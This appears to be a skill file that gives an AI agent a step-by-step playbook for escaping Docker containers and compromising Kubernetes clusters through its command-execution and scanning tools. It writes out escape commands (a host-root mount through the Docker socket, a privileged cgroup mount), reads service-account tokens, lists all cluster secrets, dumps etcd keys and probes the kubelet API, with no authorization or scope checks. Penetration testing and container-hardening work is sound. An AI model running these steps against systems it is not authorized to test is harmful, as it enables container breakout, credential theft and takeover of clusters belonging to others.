---
name: container-escape
description: Docker and Kubernetes security — container escape, pod breakout, cluster compromise, supply chain attacks
---

# Container & Kubernetes Security Skill

Assess container and orchestration security, find escape paths.

## Phase 1: Container Enumeration
1. Use `execute_command`: `cat /proc/1/cgroup 2>/dev/null` (detect containerization)
2. Use `execute_command`: `ls -la /.dockerenv /run/.containerenv 2>/dev/null`
3. Use `execute_command`: `mount | grep -E '(docker|overlay|kubernetes)'`
4. Use `execute_command`: `cat /proc/self/status | grep Cap` (check capabilities)
5. Use `execute_command`: `capsh --print 2>/dev/null` (decode capabilities)
6. Use `execute_command`: `ls -la /var/run/docker.sock` (check Docker socket mount)

## Phase 2: Docker Escape
7. Docker socket escape: `execute_command`: `docker run -v /:/host -it alpine chroot /host`
8. Privileged mode escape: `execute_command`: `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp`
9. CVE-2019-5736 (runc): Check runc version `execute_command`: `runc --version`
10. Mount namespace escape: check `/proc/1/root`
11. SYS_ADMIN capability abuse
12. Host PID namespace: `execute_command`: `ps aux` (see host processes if shared)

## Phase 3: Kubernetes Assessment
13. Use `execute_command`: `env | grep KUBERNETES` (detect K8s environment)
14. Use `execute_command`: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
15. Service account abuse: `execute_command`: `kubectl auth can-i --list`
16. Use `execute_command`: `kubectl get pods --all-namespaces`
17. Use `execute_command`: `kubectl get secrets --all-namespaces`
18. Check RBAC: `execute_command`: `kubectl get clusterrolebindings -o json`

## Phase 4: Cluster Compromise
19. Use `port_scanner` to scan internal K8s services (10.96.0.1:443, etcd:2379)
20. etcd extraction: `execute_command`: `etcdctl get / --prefix --keys-only`
21. Kubelet API: `read_url` on `https://NODE_IP:10250/pods`
22. Dashboard access: check port 8443 for exposed Kubernetes Dashboard
23. Tiller/Helm abuse for privilege escalation

## Phase 5: Reporting
24. Store findings in `memory_store` and save report with `save_artifact`
